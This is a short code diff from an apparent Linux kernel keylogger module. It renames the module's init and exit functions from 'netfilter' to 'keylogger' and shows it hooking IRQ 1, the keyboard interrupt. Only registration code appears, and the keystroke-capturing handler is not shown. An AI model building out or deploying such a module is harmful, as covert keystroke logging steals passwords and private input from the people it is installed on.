@@ -92,7 +92,7 @@ irq_handler_t interrupt_handler(int irq, void *dev_id, struct pt_regs *regs) {
 
 //#pragma GCC pop_options
 
-int __init netfilter_init(void) {
+int __init keylogger_init(void) {
     int ret;
     ret = request_irq(1, (irq_handler_t)interrupt_handler, IRQF_SHARED, name,
                       &ld);
@@ -103,7 +103,7 @@ int __init netfilter_init(void) {
     return ret;
 }
 
-void __exit netfilter_exit(void) { free_irq(1, &ld); }
+void __exit keylogger_exit(void) { free_irq(1, &ld); }
 
-module_init(netfilter_init);
-module_exit(netfilter_exit);
+module_init(keylogger_init);
+module_exit(keylogger_exit);
